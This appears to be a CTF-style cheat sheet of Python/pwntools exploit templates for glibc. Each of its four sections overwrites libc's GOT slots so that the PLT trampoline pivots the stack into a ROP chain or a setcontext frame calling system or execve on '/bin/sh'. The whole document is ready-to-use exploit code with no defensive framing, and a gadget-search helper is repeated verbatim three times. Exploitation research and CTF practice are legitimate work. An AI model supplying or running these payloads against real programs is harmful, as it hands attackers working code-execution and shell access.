# Generic
- overwrite all GOT slots
- length 0x1f0
- control main registers
- ROPchain

```py
from pathlib import Path
class ROPgadget():
    def __init__(self,libc: ELF,base=0):
        if Path("./gadgets").exists():
            print("[!] Using gadgets, make sure that's corresponding to the libc!")
        else:
            fp = open("./gadgets",'wb')
            subprocess.run(f"ROPgadget --binary {libc.path}".split(" "),stdout=fp)
            fp.close()
        fp = open("./gadgets",'rb')
        data = fp.readlines()[2:-2]
        data = [x.strip().split(b" : ") for x in data]
        data = [[int(x[0],16),x[1].decode()] for x in data]
        fp.close()
        self.gadgets = data
        self.base  = base
    def search(self,s):
        for addr,ctx in self.gadgets:
            match = re.search(s, ctx)
            if match:
                return addr+self.base
        return None   
def fx2(libc: ELF, rop_chain = [],nudge=0):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    rop = ROPgadget(libc,libc.address)
    pivot = rop.search(r"^pop rsp ; ret")
    escape = rop.search(r"^pop rsp .*jmp rax")
    return got+8, flat(
        p64(got+8+0x38*8), # the rop chain address
        p64(pivot),
        p64(plt0) * 0x36, flat(rop_chain+[escape])+p64(got+0x3000-nudge*8))
libc.address=base
rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi",'ret'])[0]
rax = rop.find_gadget(["pop rax",'ret'])[0]
rop_chain = [rdi,libc.search(b"/bin/sh").__next__(),rax,libc.sym["system"]]
dest, payload = fx2(
    libc,rop_chain=rop_chain,nudge=1)
```


# Partial Overwrite
- overwrite `slot[pos]``
- length 0x70 for pos = 6
- control main registers
- ROPchain

```python
import re
class ROPgadget():
    def __init__(self,libc: ELF,base=0):
        if Path("./gadgets").exists():
            print("[!] Using gadgets, make sure that's corresponding to the libc!")
        else:
            fp = open("./gadgets",'wb')
            subprocess.run(f"ROPgadget --binary {libc.path}".split(" "),stdout=fp)
            fp.close()
        fp = open("./gadgets",'rb')
        data = fp.readlines()[2:-2]
        data = [x.strip().split(b" : ") for x in data]
        data = [[int(x[0],16),x[1].decode()] for x in data]
        fp.close()
        self.gadgets = data
        self.base  = base
    def search(self,s):
        for addr,ctx in self.gadgets:
            match = re.search(s, ctx)
            if match:
                return addr+self.base
        return None   
def fx3(libc,pos = 1, rop_chain=[],nudge=0):
    # 
    # nudge to align stack
    assert(pos>=1)
    assert(pos<=36)
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    rop = ROPgadget(libc,libc.address)
    escape = rop.search(r"^pop rsp .*jmp rax")
    pivot = rop.search(r"^pop rsp ; ret")
    rop_chain += [escape,got+0x3000-nudge*8] 
    rop_len = len(rop_chain)
    if pos <= rop_len:
        # We can shrink it but make it more complex
        payload = flat([got+0x18+pos*8,pivot])+flat([0]*(pos-1))+p64(plt0)+flat(rop_chain)
    else:
        # We can shrink it but make it more complex
        payload = flat([got+0x18,pivot])+flat(rop_chain)+flat([0]*(pos-rop_len))+p64(plt0)
    return got+0x08,payload
rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi",'ret'])[0]
rax = rop.find_gadget(["pop rax",'ret'])[0]
rop_chain = [rdi,libc.search(b"/bin/sh").__next__(),rax,libc.sym["system"]]
dest, payload = fx3(libc,0x6,rop_chain,1) 
```

# Pos=6

- overwrite `slot[6]``
- length 0x50
- control rdi
- Fixed ROPchain

```python
import re
class ROPgadget():
    def __init__(self,libc: ELF,base=0):
        if Path("./gadgets").exists():
            print("[!] Using gadgets, make sure that's corresponding to the libc!")
        else:
            fp = open("./gadgets",'wb')
            subprocess.run(f"ROPgadget --binary {libc.path}".split(" "),stdout=fp)
            fp.close()
        fp = open("./gadgets",'rb')
        data = fp.readlines()[2:-2]
        data = [x.strip().split(b" : ") for x in data]
        data = [[int(x[0],16),x[1].decode()] for x in data]
        fp.close()
        self.gadgets = data
        self.base  = base
    def search(self,s):
        for addr,ctx in self.gadgets:
            match = re.search(s, ctx)
            if match:
                return addr+self.base
        return None   
def fx4(libc,pos = 6, rop_chain=[],nudge=0):
    # nudge to align stack
    assert(pos==6)
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    rop = ROPgadget(libc,libc.address)
    escape = rop.search(r"^pop rsp .*jmp rax")
    pivot = rop.search(r"^pop rsp ; ret")
    rsi = rop.search(r"^pop rsi ; ret")
    rop_chain += [rsi,] 
    rop_len = len(rop_chain)
    assert(rop_len<6)
    payload = flat([got+0x18,pivot])+flat(rop_chain)+p64(plt0)+flat([escape,got+0x3000-nudge*8])
    return got+0x08,payload
rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi",'ret'])[0]
rax = rop.find_gadget(["pop rax",'ret'])[0]
rop_chain = [rdi,libc.search(b"/bin/sh").__next__(),rax,libc.sym["system"]]
dest, payload = fx4(libc,0x6,rop_chain,1) 
```


# Original Exploit
- overwrite all GOT slots
- length 0x418
- control all registers
- setcontext+0x20

```py
def create_ucontext(
    src: int,
    rsp=0,
    rbx=0,
    rbp=0,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
    rsi=0,
    rdi=0,
    rcx=0,
    r8=0,
    r9=0,
    rdx=0,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b


def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )

dest, payload = setcontext32(
    libc, rip=libc.sym["execve"], rdi=libc.search(b"/bin/sh").__next__()
)
```